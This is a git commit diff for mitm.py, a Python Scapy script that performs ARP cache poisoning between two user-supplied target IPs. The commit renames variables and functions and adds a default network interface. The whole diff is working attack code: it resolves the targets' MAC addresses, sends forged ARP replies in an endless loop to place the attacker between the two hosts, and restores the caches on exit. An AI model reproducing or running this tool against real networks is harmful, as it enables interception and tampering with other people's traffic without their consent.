1f8013bd4da2f4e2b2013f68100683eb22196257
Antoine Perry <antoine.ap.57@gmail.com>
2020-05-17 16:01:56 +0200

    added pictures + default interface mitm

--- mitm/mitm.py
+++ mitm/mitm.py
@@ -1,12 +1,14 @@
-from scapy.all import *
-import sys
 import os
+import sys
 import time
+from scapy.all import *
 
 try:
-    interface = raw_input("[*] Enter Desired Interface: ")
-    victimIP = raw_input("[*] Enter Victim IP: ")
-    gateIP = raw_input("[*] Enter Router IP: ")
+    interface = raw_input("Enter Desired Interface [eth0]: ")
+    if interface == "":
+        interface = "eth0"
+    target1 = raw_input("[*] Enter target 1 IP: ")
+    target2 = raw_input("[*] Enter target 2 IP: ")
 except KeyboardInterrupt:
     print("\n[*] User Requested Shutdown")
     print("[*] Exiting...")
@@ -23,12 +25,12 @@ def get_mac(IP):
         return rcv.sprintf(r"%Ether.src%")
 
 
-def reARP():
+def undo_arp():
     print("\n[*] Restoring Targets...")
-    victimMAC = get_mac(victimIP)
-    gateMAC = get_mac(gateIP)
-    send(ARP(op=2, pdst=gateIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=7)
-    send(ARP(op=2, pdst=victimIP, psrc=gateIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateMAC), count=7)
+    target1_mac = get_mac(target1)
+    target2_mac = get_mac(target2)
+    send(ARP(op=2, pdst=target2, psrc=target1, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target1_mac), count=7)
+    send(ARP(op=2, pdst=target1, psrc=target2, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target2_mac), count=7)
     print("[*] Disabling IP Forwarding...")
     os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
     print("[*] Shutting Down...")
@@ -36,33 +38,33 @@ def reARP():
 
 
 def trick(gm, vm):
-    send(ARP(op=2, pdst=victimIP, psrc=gateIP, hwdst=vm))
-    send(ARP(op=2, pdst=gateIP, psrc=victimIP, hwdst=gm))
+    send(ARP(op=2, pdst=target1, psrc=target2, hwdst=vm))
+    send(ARP(op=2, pdst=target2, psrc=target1, hwdst=gm))
 
 
-def mitm():
+def arp_attack():
     try:
-        victimMAC = get_mac(victimIP)
+        target1_mac = get_mac(target1)
     except Exception:
         os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
-        print("[!] Couldn't Find Victim MAC Address")
+        print("[!] Couldn't Find Target 1 MAC Address")
         print("[!] Exiting...")
         sys.exit(1)
     try:
-        gateMAC = get_mac(gateIP)
+        target2_mac = get_mac(target2)
     except Exception:
         os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
-        print("[!] Couldn't Find Gateway MAC Address")
+        print("[!] Couldn't Find Target 2 MAC Address")
         print("[!] Exiting...")
         sys.exit(1)
     print("[*] Poisoning Targets...")
     while 1:
         try:
-            trick(gateMAC, victimMAC)
+            trick(target2_mac, target1_mac)
             time.sleep(1.5)
         except KeyboardInterrupt:
-            reARP()
+            undo_arp()
             break
 
 
-mitm()
+arp_attack()
